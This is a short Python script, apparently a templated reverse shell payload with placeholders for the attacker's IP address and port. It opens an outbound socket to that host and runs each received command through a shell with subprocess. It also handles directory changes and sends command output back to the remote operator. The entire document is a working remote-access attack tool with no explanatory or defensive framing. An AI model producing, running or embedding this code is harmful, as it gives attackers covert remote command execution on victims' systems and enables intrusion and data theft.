import socket, os, subprocess

IP = "{args.ip}"
PORT = {args.port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def commandhandle(data):
    if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8")) > 0:
        try:
            os.chdir(data[3:].decode("utf-8"))
            return "[*] Changed directory to: " + os.getcwd() + "\\n"
        except Exception as e:
            return "[!] Error changing directory: " + str(e) + "\\n"
    try:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        return output_str
    except Exception as e:
        return "[!] Error running command: " + str(e) + "\\n"

while True:
    data = s.recv(1024)
    if not data:
        s.send(str.encode("[!] No data received"))
        break
    else:
        result = commandhandle(data)
        s.send(str.encode(result))

s.close()
